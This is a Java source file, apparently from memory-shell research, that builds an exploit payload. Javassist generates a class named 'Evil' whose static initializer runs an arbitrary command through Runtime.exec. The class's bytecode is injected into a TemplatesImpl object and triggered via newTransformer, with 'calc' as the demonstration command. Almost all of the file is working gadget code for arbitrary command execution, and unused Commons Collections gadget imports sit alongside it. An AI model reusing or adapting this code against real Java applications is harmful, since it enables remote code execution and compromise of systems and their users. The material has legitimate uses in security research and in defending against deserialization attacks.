package javassist;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class EXP {
    public static void setValue(String name, Object target, Object value) {
        try {
            Field field = target.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(target, value);
        } catch (Exception ignore) {
        }
    }


    public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            byte[] bytes = ctClass.toBytecode();
            ctClass.writeFile("E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\src\\main\\java\\javassist");
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name", "aaa");

        byte[] code = getTemplatesImpl("calc");
        byte[][] bytecodes = {code};
        setValue(templates, "_bytecodes", bytecodes);
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        templates.newTransformer();

    }
}
